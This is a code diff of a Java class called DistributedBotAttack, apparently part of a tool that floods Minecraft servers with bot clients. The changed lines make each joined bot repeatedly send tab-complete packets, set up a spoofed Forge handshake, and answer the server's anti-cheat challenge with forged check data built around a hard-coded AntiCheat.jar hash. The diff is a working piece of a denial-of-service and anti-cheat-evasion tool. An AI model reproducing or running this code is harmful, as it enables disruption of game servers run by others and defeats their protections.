@@ -77,8 +77,7 @@ public class DistributedBotAttack extends IAttack {
 					synchronized (clients) {
 						clients.forEach(c->{
 							if(c.getSession().isConnected()) {
-								Object isjoin=c.getSession().getFlag("join");
-								if(isjoin!=null&&((boolean)isjoin)==true) {
+								if(c.getSession().hasFlag("join")) {
 									c.getSession().send(new ClientTabCompletePacket("/"));
 								}
 							}
@@ -146,10 +145,9 @@ public class DistributedBotAttack extends IAttack {
 	
 	public Client createClient(final String ip,int port,final String username,Proxy proxy) {
 		Client client=new Client(ip,port,new MinecraftProtocol(username), new TcpSessionFactory(proxy));
-		MCForge forge=new MCForge(client.getSession(),this.modList);
+		new MCForge(client.getSession(),this.modList).init();
 		client.getSession().addListener(new SessionListener() {
 			public void packetReceived(PacketReceivedEvent e) {
-				forge.handle(e.getSession(),e.getPacket());
 				if (e.getPacket() instanceof ServerPluginMessagePacket) {
 					ServerPluginMessagePacket packet=e.getPacket();
 					switch(packet.getChannel()) {
@@ -157,9 +155,6 @@ public class DistributedBotAttack extends IAttack {
 							String code=acp.uncompress(packet.getData());
 							byte[] checkData=acp.getCheckData("AntiCheat.jar",code,new String[] {"44f6bc86a41fa0555784c255e3174260"});
 							e.getSession().send(new ClientPluginMessagePacket("AntiCheat3.4.3",checkData));
-							break;
-						case "MC|Brand":
-							e.getSession().send(new ClientPluginMessagePacket("MC|Brand","fml,forge".getBytes()));
 							break;
 						default:
  					}
